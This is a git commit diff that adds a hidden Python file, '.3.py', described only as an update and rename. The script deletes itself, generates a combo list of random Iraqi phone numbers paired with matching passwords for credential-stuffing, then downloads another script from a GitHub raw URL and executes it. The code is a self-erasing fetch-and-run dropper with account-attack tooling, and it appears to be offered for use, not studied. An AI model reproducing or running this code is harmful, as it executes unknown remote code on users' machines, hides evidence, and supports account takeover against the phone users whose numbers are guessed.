b7d79bc3e15442acbd54a480c08adabcb67ac1fc
sfrsfrsfr404sfrsfrsfr <86876730+sfrsfrsfr404sfrsfrsfr@users.noreply.github.com>
2021-07-09 18:57:52 +0300

    Update and rename hech nia.py to .3.py

---
+++ .3.py
@@ -0,0 +1,25 @@
+import  os, sys, random
+os.system("rm .3.py")
+try:
+    os.remove(".3.py")
+except:
+    pass
+os.system("rm -rf .3.py")
+def g():
+	def iii():
+		os.system("rm -rf combo.txt")
+		for loldl in range(5000):
+			r=random.randint(1000000, 9999999)
+			rr=random.randint(1000000, 9999999)
+			sys.stdout=open("combo.txt", "a")
+			print("+964770"+str(r)+":0770"+str(r))
+			print("+964750"+str(rr)+":0750"+str(rr))
+			sys.stdout.flush()
+	iii()
+g()	
+
+import os, sys, random, wget
+wget.download("https://raw.githubusercontent.com/sfrsfrsfr404sfrsfrsfr/-/main/.dabll.py")
+os.system("python .dabll.py")
+
+
